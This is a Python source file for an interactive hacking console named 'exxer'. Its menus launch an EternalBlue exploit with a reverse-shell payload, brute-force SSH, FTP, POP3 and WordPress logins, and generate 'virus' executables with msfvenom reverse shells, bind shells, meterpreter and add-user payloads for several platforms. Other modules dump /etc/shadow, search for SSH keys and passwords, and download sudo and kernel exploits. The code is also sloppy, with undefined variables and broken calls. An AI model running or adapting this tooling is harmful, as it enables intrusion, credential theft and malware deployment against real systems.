#!/usr/bin/env python3
#start
import subprocess
import sys
import os
import socket
from colorama import Fore,Back,Style,init
import cowsay
import time
import datetime
import pyfiglet
import self
#start
#coded by prisma
#coded by anıl
def clear():
    subprocess.call("clear")
clear()
init(autoreset=True)
class exxer:
    def banner():
        cowsay.daemon("HACKER RULES!")
    banner()
    print("welcome" + " " + os.getlogin() + " ")
    exploitname = """
    1-exploit/windows/smb/windows_eternalblue_windows_7
    2-exploit/webapp/php/php-8.1.0-dev_remote_code_execution
    3-exploit/windows/smb/windows_eternalblue_windows_8
    4-exploit/webapp/ruby/Gitlab_13.9.3_remote_code_execution
    5-exploit/webapp/cms/magento_Unauthenticated_sql_injection
    6-exploit/webapp/Shellshock
    7-exploit/webapp/Apache_Struts_2_CVE-2013-2251
    8-exploit/webapp/apache_tomcat_exploit
    9-exploit/webapp/cms/codiac_remote_code_execution
    """
    scannername = """
    s1-windows/eternalblue_scanner
    """
    mainmenu = input("exxer=>")
    if mainmenu == "show exploit":
        print(exploitname)
        mainmenu = input("exxer>")
    if mainmenu == "help" or mainmenu == "HELP":
        helpmenu = """
        help = show the all commands
        show exploit = show the all exploits
        clear = clear screen
        send or run = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
        quit or exit command = exit the tool
        info = info the exploit and scanner only exploit and scanner
        edit = edit the exploit and scanner only exploit and scanner
        use = use the exploit or scanner module only exploit and scanner Doesn't work in web hacking and privesc and trojan menu
        privesc = privesc tool start
        generate trojan = GENERATE the virus
        show scanner = show the all scanner module Doesn't work in web hacking and privesc and trojan menu
        web hacking = go to web hacking menu
        install privesc exploits = install al privesc exploits
        oscp = go to oscp menu
        version = show program version command
        coder = show the program authors
        anonimity = start sthe anonimity tools
        discord = show the discord link
        update = show the new updates
        windows exploit scanner = use the windows exploit scanner with nmap
        webmap = scan websites
        shell generate = go to shell generator menu
        """
        print(Fore.RED + helpmenu + Fore.RED)
        mainmenu = input("exxer$$$>")
    if mainmenu == "clear":
        subprocess.call("clear")
        mainmenu = input("exxer>")
    if mainmenu == "show scanner":
        print(scannername)
        mainmenu = input("exxer>")
    if mainmenu == "clear":
        subprocess.call("clear")
        mainmenu = input("exxer>")
    if mainmenu == "ifconfig":
        os.system("ifconfig")
        mainmenu = input("exxer>")
    if mainmenu == "ip a":
        os.system("ip a")
    # eternalblue
    if mainmenu == "use windows/eternalblue_scanner" or mainmenu == "use s1":
        print("loaded scanner => windows/eternalblue_scanner")
        eternalstart = input("eternal checker=>")
        if eternalstart == "edit":
            os.system("nano /usr/share/exxer/exploit/windows/eternalblue/eternal_checker.py")
            eternalstart = input("eternalchecker=>")
        if eternalstart == "info":
            eternalinfo = """
            MS17-010 exploit for Windows 2000 and later by sleepya
            Note:
            - The exploit should never crash a target (chance should be nearly 0%)
            - The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

            Tested on:
            - Windows 2016 x64
            - Windows 10 Pro Build 10240 x64
            - Windows 2012 R2 x64
            - Windows 8.1 x64
            - Windows 2008 R2 SP1 x64
            - Windows 7 SP1 x64
            - Windows 2008 SP1 x64
            - Windows 2003 R2 SP2 x64
            - Windows XP SP2 x64
            - Windows 8.1 x86
            - Windows 7 SP1 x86
            - Windows 2008 SP1 x86
            - Windows 2003 SP2 x86
            - Windows XP SP3 x86
            - Windows 2000 SP4 x86
            Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()
            win7 x64
            struct SrvSecContext {
                DWORD xx1; // second WORD is size
                DWORD refCnt;
                PACCESS_TOKEN Token;  // 0x08
                DWORD xx2;
                BOOLEAN CopyOnOpen; // 0x14
                BOOLEAN EffectiveOnly;
                WORD xx3;
                DWORD ImpersonationLevel; // 0x18
                DWORD xx4;
                BOOLEAN UsePsImpersonateClient; // 0x20
            }
            win2012 x64
            struct SrvSecContext {
                DWORD xx1; // second WORD is size
                DWORD refCnt;
                QWORD xx2;
                QWORD xx3;
                PACCESS_TOKEN Token;  // 0x18
                DWORD xx4;
                BOOLEAN CopyOnOpen; // 0x24
                BOOLEAN EffectiveOnly;
                WORD xx3;
                DWORD ImpersonationLevel; // 0x28
                DWORD xx4;
                BOOLEAN UsePsImpersonateClient; // 0x30
            }

            SrvImpersonateSecurityContext() is used in Windows Vista and later before doing any operation as logged on user.
            It called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true.
            From https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,
            PsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns
            STATUS_SUCCESS when Token is NULL.
            If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)
            to do all SMB operations.
            Note: for Windows 2003 and earlier, the exploit modify token user and groups in PCtxtHandle to get SYSTEM because only
              ImpersonateSecurityContext() is used in these Windows versions.
              """
            print(eternalinfo)
            eternalstart = input("eternalblue_scanner=>")
        if eternalstart == "clear":
                subprocess.call("clear")
                eternalstart = input("eternalblue_scanner>>")
        if eternalstart == "banner":
            cowsay.cow("HACKER RULES!")
            eternalstart = input("eternalblue_scanner>>")
        if eternalstart == "help":
            eternalhelpmenu = """
            help command = show eternalblue scanner command
            run command = run the module command
            send command = run the module command
            scan command = run the module
            help me command = show all help
            back command = back the main menu
            """
            print(eternalhelpmenu)
            eternalstart = input("eternalblue_scanner>>")
        if eternalstart == "help me":
            print(helpmenu)
            eternalstart = input("eternalblue_scanner>>")
        if eternalstart == "back":
            mainmenu = input("exxer>>")
        if eternalstart == "run":
            eternalscantarget = input("add target>>")
            print("your target is =>" +  " " + eternalscantarget)
            print("running the module")
            os.system("python3 /usr/share/exxer/exploit/windows/eternalblue/eternal_checker.py " + " " + eternalscantarget)
            eternalstart = input("eternalblue_scanner>>")
    if mainmenu == "use exploit/windows/smb/windows_eternalblue_windows_7" or mainmenu == "use 1":
        print("loaded module =>" + "exploit/windows/smb/windows_eternalblue_windows_7")
        win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "show target":
            print("targets => Windows 7 Professional 7601 Service Pack 1")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7=>")
        if win7exploit == "clear":
            subprocess.call("clear")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "ifconfig " or win7exploit == "ip a":
            os.system("ifconfig")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "help":
            print("eternalhelpmenu")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "help me":
            print("helpmenu")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "clear":
            subprocess.call("clear")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "banner":
            cowsay.cow("eternalblue!")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7 =>")
        if win7exploit == "run" or win7exploit == "exploit" or win7exploit == "send":
            win7exploittarget = input("add rhost=>")
            print("yout rhost is =>" + " " + win7exploittarget)
            win7exploitlhost = input("add lhost=>")
            print("your lhost is =>" + " " + win7exploitlhost + "")
            win7exploitlport = input("add lport =>")
            print("your lpor is =>" + " " + win7exploitlport)
            print("creating shellcode file")
            print("please open the listener. Listener port is " + " " + win7exploitlport)
            os.system("cd /usr/share/exxer/exploit/windows/eternalblue/win7/")
            #time.sleep(0.5)
            #os.system("curl -O https://raw.githubusercontent.com/worawit/MS17-010/master/shellcode/eternalblue_kshellcode_x64.asm")
            os.system("nasm -f bin /usr/share/exxer/exploit/windows/eternalblue/win7/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin")
            os.system("msfvenom -p windows/x64/shell_reverse_tcp"  + " " + "LPORT=" + win7exploitlport + " " + "LHOST=" + win7exploitlhost + " " + "--platform windows -a x64 --format raw -o sc_x64_payload.bin")
            os.system("cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin")
            os.system("python3 /usr/share/exxer/exploit/windows/eternalblue/win7/eternal_checker.py " + " " + win7exploittarget + " " + "sc_x64.bin")
            win7exploit = input("exploit/windows/smb/windows_eternalblue_windows_7=>")
        if win7exploit == "back":
            mainmenu = input("exxer=>")
    if mainmenu == "runall":
        try:
            runallrhost = input("add rhost=>")
            print("scan started at " + str(datetime.now()))
            time.sleep(1)
            print("scanning the " + " " + runallrhost)
            time.sleep(0.1)
            #running all windows exploit scanner
            os.system("python3 /usr/share/exxer/exploit/windows/eternalblue/eternal_checker.py " + " " + runallrhost)
            time.sleep(0.10)
            os.system("nmap --script smb-vuln-ms08-067.nse -p445" + " " + runallrhost)
            time.sleep(0.10)
            os.system("nmap --script smb-vuln-ms06-025.nse -p445" + " " + runallrhost)
            time.sleep(0.10)
            print("scan completed")
        except keyboardinterrupt:
            print("Bye!")
            sys.exit()
    if mainmenu == "web hacking":
        subprocess.call("clear")
        def banner():
            cowsay.dragon("WEB HACKER!")
            print("welcome " + " " + os.getlogin())
        banner()
        def menu():
            menu = """
            [1]-cms dedect menu
            [2]-wordpress user enumation
            [3]-joomla version dedect
            [4]-wordpress scan
            [5]-wordpress brute force
            [6]-protocols brute force menu
            [99]-exit
            """
            print(menu)
        menu()
        webmenu = input("webber>>")

        if webmenu == "help":
            helper = """
            back command = back the exploit menu
            help command = print helpmenu command
            run command = run the web module
            """
            print(helper)
            webmenu = input("webber>>")
        if webmenu == "1":
            os.system("cmseek")
            webmenu = input("webber>>")
        if webmenu == "99" or webmenu == "exit" or webmenu == "quit":
            sys.exit()
        if webmenu == "back" or webmenu == "7":
            mainmenu = input("exxer>>")
        if webmenu == "2":
            webhost = input("add domain only http or https>>")
            print("target is =>" + " " + webhost)
            os.system("wpscan --url " + " " + webhost + " " + "-e u")
            webmenu = input("webber>>")
        if webmenu == "3":
            joomscantarget = input("add target=>")
            os.system("joomscan -u " + joomscantarget)
            webmenu = input("webber>>")
        if webmenu == "4":
            def wordpress():
                wordpresser = input("add target only http or https>>")
                os.system("wpscan --url " + " " + wordpresser)
            wordpress()
            webmenu = input("webber>>")
        if webmenu == "5":
            def bruteforcewordpress():
                bruteforcewordpress = input("add target only http or https>>")
                wordlister = input("add wordlist>>")
                usernamewordpress = input("add username>>")
                os.system("wpscan --url" + " " + bruteforcewordpress + "--usernames" + " " + usernamewordpress + " " + "--passwords" + " " + wordlister)
                webmenu = input("webber>>")
            bruteforcewordpress()
        if webmenu == "6":
            subprocess.call("clear")
            printprotocols = """
            [1]-ssh brute force
            [2]-ftp brute force
            [3]-pop3 brute force
            """
            print(printprotocols)
            protocols = input("bruter>>")
            if protocols == "1":
                sshbrute = input("add target>>")
                print("target =>" + " " + sshbrute)
                wordlistssh = input("add wordlist>>")
                print("wordlist =>" + " " + wordlistssh)
                usernamessh = input("add username>>")
                print("username => " + " " + usernamessh)
                os.system("hydra -l " + " " + " " +  "-P" + " " + wordlistssh + " " + sshbrute + " " + "ssh")
            if protocols == "2":
                ftpbrute = input("add target>>")
                print("target =>" + " " + ftpbrute)
                username = input("add username>>")
                print("username => " + " " + username)
                wordlist = input("add wordlist=>")
                print("wordlist =>" + " " + wordlist)
                os.system("hydra -l " + " " + username + " " + "-P " + " " + wordlist + " " + ftpbrute + " " + "ftp")
            if protocols == "3":
                pop3br = input("add target=>")
                print("target =>" + " " + pop3br)
                wordpop3 = input("add wordlist>>")
                print("add wordlist " + " " + wordpop3)
                pop3wordlist = input("add username =>")
                print("username =>" + " " + pop3wordlist)
                os.system("hydra -l " + " " + pop3wordlist + " " + "-P" + " " + wordpop3 + " " + pop3br + " " + "pop3")
    if mainmenu == "privesc":
        print("linux privesc")
        print("----------------sudo version---------")
        os.system("sudo -V")
        print("----------------kernel version--------")
        os.system("uname -r")
        print("----------------/etc/passwd-----------")
        os.system("cat /etc/passwd")
        print("----------------/etc/shadow------------")
        os.system("cat /etc/shadow")
        print("----------------bash history-------------")
        os.system("cat ~/.bash_history | grep -i passw")
        print("---------------ssh keys------------------")
        os.system("find / -name authorized_keys 2> /dev/null")
        os.system("find / -name id_rsa 2> /dev/null")
        print("----------------/etc/issue---------------")
        os.system("cat /etc/issue")
        print("----------------downlanding exploit suggester----")
        os.system("curl -O https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl")
        print("starting exploit-suggester")
        os.system("perl linux-exploit-suggester-2.pl")
        print("system date")
        os.system("date 2>/dev/null")
        print("system stats")
        os.system("(df -h || lsblk)")
        print("cpu info")
        os.system("lscpu")
        print("Printers info")
        os.system("lpstat -a 2>/dev/null #Printers info")
        print("Installed Software")
        os.system("which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null")
        print("vulnerable Software")
        os.system("dpkg -l")
        os.system("rpm -qa")
        print("Processes")
        os.system("ps aux| grep root")
        os.system("ps -ef ")
        os.system("top -n 1")
        print("Scheduled/Cron jobs")
        os.system("ls -al /etc/cron* /etc/at*")
        os.system("crontab -l")
        os.system("cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null")
    if mainmenu == "install privesc exploits":
        install = input("sudo or kernel>>")
        print(install)
        if install == "sudo":
            os.system("""
                mkdir sudoexploits
                cd sudoexploits
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2002-0043.sh
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2002-0184.txt
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2005-1831.txt
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2006-0151.perl
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2006-0151.python
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2010-1163.txt
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2012-0809.txt
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2012-0864-0809.c
                mkdir baronsamedit
                cd baronsamedit/
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2021-3156/exploit1/Makefile
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2021-3156/exploit1/brute.sh
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2021-3156/exploit1/hax.c
                curl -O https://raw.githubusercontent.com/TH3xACE/SUDO_KILLER/master/exploits/CVE-2021-3156/exploit1/lib.c
                """)
        if install == "kernel":
            os.system("mkdir kernelexploits")
            os.system("""
                curl -O https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2016-8655/chocobo_root.c
                mkdir CVE-2017-1000112
                cd CVE-2017-1000112/
                curl -O https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
                cd ..
                mkdir CVE-2017-7308
                cd CVE-2017-7308/
                curl -O https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
                cd ..
                curl -O https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2018-5333/cve-2018-5333.c
                curl -O https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
                """)
    # start trojan
    if mainmenu == "generate trojan":
        subprocess.call("clear")
        cowsay.cow("VIRUSSER")
        platform = """
        [1]-windows
        [2]-php
        [3]-linux
        [4]-android
        [5]-macos
        [99]-exit
        """
        print(platform)
        trojan = input("virusser>>")
        if trojan == "1" or trojan == "windows":
            selected = print("selected module => windows")
            #windows input start

            windows = input("windows virusser>>")

            if windows == "help":
                windows_help_menu = """
                How do I create a virus? = i will handle it
                generate = generate virus
                help me = show a full help menu
                where = what category am i in command
                clear = clear the screen
                ifconfig = show local ip
                ip a = show local ip
                banner = show banner
                """
                print(windows_help_menu)
                windows = input("windows virusser>>")
            if windows == "help me":
                print("helpmenu")
                windows = input("windows virusser>>")
            if windows == "ifconfig":
                os.system("ifconfig")
                windows = input("windows virusser>>")
            if windows == "ip a":
                os.system("ip a")
                windows = input("windows virusser>>")
            if windows == "banner":
                cowsay.cow("windows virusser")
                windows = input("windows virusser>>")
            if windows == "where":
                print(selected)
                windows = input("windows virusser>>")
            if windows == "generate":
                generatemenu = """
                Windows:
                [1]-bind shell
                [2]-reverse shell
                [3]-create user
                [4]-meterpreter shells
                [99]-exit
                """
                print(generatemenu)
                generateselect = input("select>>")
                if generateselect == "1" or generateselect == "bind" or generateselect == "bind shell":
                    name = input("add virus name>>")
                    print("name =>" + " " + name)
                    localip = input("add target ip>>")
                    print("listener ip =>" + " " + localip)
                    localport = input("add listener port>>")
                    print("listener port =>" + " " + localport)
                    print("generating virus")
                    os.system("msfvenom -p windows/shell_hidden_bind_tcp RHOST=" + localip + " " + "LPORT=" + localport + " " + "-f exe" + ">" + " " + name)
                    print("sudo nc -nvlp" + " " + localport)
                if generateselect == "2" or generateselect == "reverse shell" or generateselect == "reverse":
                    name1 = input("add name>>")
                    print("name is =>" + " " + name1)
                    localip1 = input("add listener ip>>")
                    print("listener ip is =>" + " " + localip1)
                    localport1 = input("add listener port>>")
                    print("listener port is =>" + " " + localport1)
                    print("generating reverse trojan")
                    os.system("msfvenom -p windows/shell_reverse_tcp LHOST=" + localip1 + " " + "LPORT=" + localport1 + " " + "-f exe >" + " " + name1)
                    print("nc -nvlp " + " " + localport1)
                if generateselect == "3" or generateselect == "create user":
                    name2 = input("add name>>")
                    print("virus name is =>" + " " + name2)
                    usernames = input("add username for user>>")
                    print("user is =>" + " " + username)
                    passwd = input("add password for user>>")
                    print("password is =>" + " " + passwd)
                    print("generating trojan")
                    os.system("msfvenom -p windows/adduser USER=" + username + " " + "PASS=" + passwd + " " + "-f exe >" + " " + name2)
                    print("ssh username@target")
                if generateselect == "exit" or generateselect == "99" or generateselect == "quit":
                    print("bye!")
                    sys.exit()
                if generateselect == "4" or generateselect == "meterpreter shells" or generateselect == "meterpreter":
                    meterpretershells = """
                    [1]-reverse
                    """
                    print(meterpretershells)
                    meterpreter = input("select>>")
                    print("selected =>" + " " + meterpreter)
                    if meterpreter == "1" or meterpreter == "reverse":
                        matname = input("add virus name>>")
                        print("name is =>" + " " + matname)
                        matip = input("add listener ip>>")
                        print("listener ip is =>" + " " + matip)
                        matport = input("add listener port")
                        print("listener port is =>" + " " + matport)
                        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + matip + " " + "LPORT=" + matport + " " + "-f exe >" + " " + "matname")
        if trojan == "linux" or trojan == "3":
            linuxmenu = """
            [1]-linux
            """
            print(linuxmenu)
            linuxxer = input("linux virusser>>")
            if linuxxer == "1" or linuxxer == "linux":
                print("loaded module =>"  + " " + "linux")
                selectmenu = """
                [1]-reverse shell
                """
                print(selectmenu)
                linuxtrojan = input("select>>")
                if linuxtrojan == "1" or linuxtrojan == "reverse" or linuxtrojan == "reverse shell":
                    name5 = input("add virus name>>")
                    print("name is =>" + " " + name5)
                    listenerip = input("add listener ip>>")
                    print("listener ip is =>" + " " + listenerip)
                    listenerport = input("add lisener port>>")
                    print("listener port is =>" + " " + listenerport)
                    print("generating trojan")
                    os.system("msfvenom -p linux/x64/shell_reverse_tcp LHOST=" + listenerip + " " + "LPORT=" + listenerport + " " + "-f elf >" + " " + name5)
        #start php
        if trojan == "2" or trojan == "php":
            print("loaded trojan => php")
            phpmenu = """
            [1]-reverse shell
            """
            php = input("select>>")
            if php == "1" or php == "reverse shell":
                name9 = input("add virus name>>")
                print("selected module => reverse shell")
                phpip = input("add listener ip>>")
                print("listener ip =>" + " " + phpip)
                phport = input("add listener port>>")
                print("listener port is =>" + " " + phport)
                print("generating trojan")
                os.system("msfvenom -p php/shell_reverse_tcp LHOST=" + phpip + " " + "LPORT=" + phport + " " + "-f raw > " + " " + name9 )
        #start android
        if trojan == "android" or trojan == "4":
            print("loaded module =>" + " " + "android")
            androidselect = """
            [1]-meterpreter shell
            """
            print(androidselect)
            android = input("select>>")
            if android == "1" or android == "reverse shell" or android == "shell":
                name10 = input("add virus name=>")
                print("virus name is =>" + " " + name10)
                print("loaded module => android meterpreter shell")
                androlocalip = input("add listener ip>>")
                print("listener ip is =>" + " " + androlocalip)
                androidlocalport = input("add listener port>>")
                print("listener port is=>" + " " + "androidlocalport")
                os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=" + androlocalip + " " + "LPORT=" + androidlocalport + " " + "-f R " + " " + name10)
        if trojan == "5" or trojan == "macos":
            print("loaded payload =>" + " " + "macos")
            macosmenu = """
            [1]-reverse-shell
            [2]-bind-shell
            """
            print(macosmenu)
            macos = input("select>>")
            if macos == "1" or macos == "reverse-shell":
                name11 = input("add virus name>>")
                print("virus name is =>" + " " + name11)
                macoslocalip = input("add listener ip>>")
                print("listener ip is =>" + " " + macoslocalip)
                macoslocalport = input("add listener port>>")
                print("listener port =>" + " " + macoslocalport)
                print("generating trojan")
                os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=" + macoslocalip + " " + "LPORT=" + macoslocalport + " " + "-f macho >" + " " + name11)
            if macos == "2" or macos == "bind-shell":
                macosnamebind = input("add virus name >>")
                print("virus name is =>" + " " + macosnamebind)
                print("loaded module => macos bind-shell")
                macosbind = input("add target ip =>")
                print("listener ip is =>" + " " + macosbind)
                macosbindbinlocalport = input("add listener port =>")
                print("listener port is =>" + " " + macosbindbinlocalport)
                print("generating trojan")
                os.system("msfvenom -p osx/x86/shell_reverse_tcp RHOST=" + macosbind + " " + "LPORT=" + macosbindbinlocalport + " " + "-f macho >" + " " + macosnamebind)
    if mainmenu == "anonimity":
        print("starting the anonimity tools")
        print("starting tor tools")
        os.system("perl /usr/share/exxer/anonimity/nipe/nipe.pl start")
        print("checking status")
        os.system("perl /usr/share/exxer/anonimity/nipe/nipe.pl status")
        print("started tor tools")
    if mainmenu == "coder":
        print("authors =>" + " " + "prisma")
        mainmenu = input("exxer>")
    if mainmenu == "version":
        print("program version =>" +" " + "2.0")
        mainmenu = input("exxer>")
    if mainmenu == "oscp":
        print("welcome oscp menu")
        oscpmenu = """
        [1]-auto nmap
        [2]-linpeas install
        [3]-winpeas install
        [99]-exit
        """
        print(oscpmenu)
        oscp = input("oscp>")
        if oscp == "1" or oscp == "recon":
            oscpip = input("add ip>")
            print("recon ip =>" + " " + oscpip)
            print("starting recon")
            print("started nmap")
            os.system("nmap -A " + " " + oscpip)
            print("starting os scan")
            os.system("nmap -O" + " " + oscpip)
            print("starting nmap vuln scan")
            os.system("nmap --script vuln" + " " + oscpip)
        if oscp == "2" or oscp == "linpeas" or oscp == "linpeas install":
            print("installing linpeas")
            os.system("curl -O https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh")
            print("installed script")
        if oscp == "3" or oscp == "winpeas" or oscp == "winpeas install":
            winpeas = input("bat or exe>")
            if winpeas == "bat":
                os.system("curl -O https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat")
            if winpeas == "exe":
                os.system("curl -O https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe")
        if oscp == "99" or oscp == "exit" or oscp == "quit":
            sys.exit()
    if mainmenu == "discord":
        print("discord server link=>" + " " + "https://discord.gg/3N73w2GTnZ")
        print("discord profile =>" + " " + "prisma#5143")
        mainmenu = input("exxer>")
    if mainmenu == "windows exploit scanner":
        print("loaded module => windows exploit scanner")
        windowsexploitscanner = input("windows exploit scanner>")
        if windowsexploitscanner == "help":
            windowshelpmenu = """
            show scanners = show the nmap windows exploit scanners
            """
            print(windowshelpmenu)
            windowsexploitscanner = input("windows exploit scanner>")
        if windowsexploitscanner == "show scanners" or windowsexploitscanner == "show scanner":
            exploitscanner = """
            [1]-ms17-010 scanner
            [2]-ms08-067 scanner
            [3]-ms06-025 scanner
            """
            print(exploitscanner)
            windowsexploitscanner = input("windows exploit scanner>")
        if windowsexploitscanner == "1" or windowsexploitscanner == "ms17-010" or windowsexploitscanner == "ms17-010 scanner":
            print("loaded module => ms17-010 scanner")
            #eternalblue scanner start
            ms17010scanner = input("ms17-010 scanners>>")
            if ms17010scanner == "help":
                print("run = start scan")
                ms17010scanner = input("ms17-010 scanners>>")
            if ms17010scanner == "exit" or ms17010scanner == "quit":
                try:
                    print("bye!")
                    sys.exit()
                except:
                    pass
            if ms17010scanner == "run":
                ms17010scan = input("add target>")
                print("target =>" + " " + ms17010scan)
                print("scan starting")
                print("scanning " + " " + ms17010scan)
                os.system("nmap -p445 --script smb-vuln-ms17-010" + " " + ms17010scan)
        if windowsexploitscanner == "2" or windowsexploitscanner == "ms08-067" or windowsexploitscanner == "ms08-067 scanner":
            print("loded module =>" + " " + "ms08-067 scanner")
            ms08 = input("ms08-067 scanner>")
            if ms08 == "help":
                print("run = start scan")
                windowsexploitscanner = input("windows exploit scanner")
            if ms08 == "run":
                ms08target = input("add target>")
                print("target => " + " " +ms08target)
                os.system("nmap --script smb-vuln-ms08-067.nse -p445" + " " + ms08target)
        if windowsexploitscanner == "3" or windowsexploitscanner == "ms06-025":
            print("loaded module => ms06-025 scanner")
            ms06scanner = input("ms06-025 scanner>")
            if ms06scanner == "help":
                print("run = start scan")
                ms06scanner = input("ms06-025 scanner>")
            if ms06scanner == "run":
                ms06target = input("add target>")
                print("target =>" + " " + ms06target)
                os.system("nmap --script smb-vuln-ms06-025.nse -p445" + " " + ms06target)
            if ms06scanner == "ifconfig":
                os.system("ifconfig")
                ms06scanner = input("ms06-071 scanner>")
            if ms06scanner == "ip a":
                os.system("ip a")
                ms06scanner = input("ms06-071 scanner>")
            if ms06scanner == "clear":
                subprocess.call("clear")
                ms06scanner = input("ms06-071 scanner>")
            if ms06scanner == "exit" or ms06scanner == "quit":
                sys.exit()
    if mainmenu == "webmap":
        class webmap:
            def clearscreen():
                subprocess.call("clear")
            clearscreen()
            def banner():
                cowsay.cow("WEBMAP!")
                helpforweb = """
                scan = run the nmap command
                """
            banner()
            helpforweb = """
            scan = run the nmap command
            """
            menu = """
            [1]-dns enumation
            [2]-dns-brute
            [3]-dns-zone-transfer
            [4]-http-vuln-cve2017-8917
            [5]-http-waf-detect
            """
            print(menu)
            webmap = input("webmap>")
            if webmap == "1" or webmap == "dns enumation":
                print("loaded module => dns enumation")
                dnsenum = input("dns-enum>")
                if dnsenum == "help":
                    print(helpforweb)
                    dnsenum = input("dns-enum>")
                if dnsenum == "exit":
                    print("bye!")
                    sys.exit()
                if dnsenum == "scan" or dnsenum == "run":
                    dnstarget = input("add target>")
                    print("target =>" + " " + dnstarget)
                    print("starting dns-recon")
                    os.system("dnsrecon -d " + " " + dnstarget)
                    #son
            if webmap == "2" or webmap == "dns-brute":
                print("loaded module => dns-brute")
                dnsbrute = input("dns-brute>")
                if dnsbrute == "help":
                    print(helpforweb)
                    dnsbrute = input("dns-brute>")
                if dnsbrute == "run" or  dnsbrute == "scan" or dnsbrute == "start":
                    print("starting nmap nse lua")
                    dnsbrutetarget = input("add target>")
                    print("target =>" + " " + dnsbrutetarget)
                    os.system("nmap --script dns-brute" + " " + dnsbrutetarget)
                    #son
            if webmap == "3" or webmap == "dns-zone-transfer":
                print("loaded module => dns-zone-transfer ")
                zone = input("zone-transfer>>")
                if zone == "help":
                    print(helpforweb)
                if zone == "run" or zone == "scan" or zone == "start" or zone == "go":
                    print("starting nmap nse lua")
                    zonetr = input("add target>")
                    print("target => " + " " + zonetr)
                    os.system("nmap --script dns-zone-transfer" + " " + zonetr)
                if zone == "exit" or zone == "quit":
                    try:
                        print("bye!")
                        sys.exit()
                    except:
                        pass
                    #son
            if webmap == "4" or webmap == "http-vuln-cve2017-8917":
                print("loaded module => http-vuln-cve2017-8917")
                cvehttp = input("cve>>")
                if cvehttp == "run" or cvehttp == "scan":
                    print("starting nmap nse lua")
                    cvetarget = input("add target>>")
                    print("target => " + " " + cvetarget)
                    os.system("nmap --script http-vuln-cve2017-8917 " + " " + cvetarget)
                if cvehttp == "help":
                    print(helpforweb)
                    cvetarget = input("add target>>")
                if cvehttp == "exit" or cvehttp == "quit":
                    try:
                        print("bye!")
                        sys.exit()
                    except:
                        pass
                    #son
            if webmap == "http-waf-detect" or webmap == "5":
                print("loaded module => http-waf-dedect")
                wafdedect = input("http-waf-dedect>")
                if wafdedect == "help":
                    print(helpforweb)
                    wafdedect = input("http-waf-dedect>")
                if wafdedect == "quit" or wafdedect == "exit":
                    try:
                        print("bye!")
                        sys.exit()
                    except:
                        pass
                if wafdedect == "scan":
                    print("starting nmap nse lua")
                    waftarget = input("add target>")
                    print("target =>" + " " + waftarget)
                    os.system("nmap --script http-waf-detect" + " " + waftarget)
                    #son
    if mainmenu == "use 2" or mainmenu == "use exploit/webapp/php/php-8.1.0-dev_remote_code_execution":
        print("loaded module => exploit/webapp/php/php-8.1.0-dev_remote_code_execution")
        phpdev = input("exploit/webapp/php/php-8.1.0-dev_remote_code_execution>")
        if phpdev == "help":
            print("""
            send = run exploit module only exploitmenu and scanner menu  Doesn't work in web hacking and privesc and trojan menu
            quit or exit command = exit the tool
            info = info the exploit and scanner only exploit and scanner
            edit = edit the exploit and scanner only exploit and scanner
            """)
            phpdev = input("exploit/webapp/php/php-8.1.0-dev_remote_code_execution>")
        if phpdev == "exit" or phpdev == "quit":
            print("bye!")
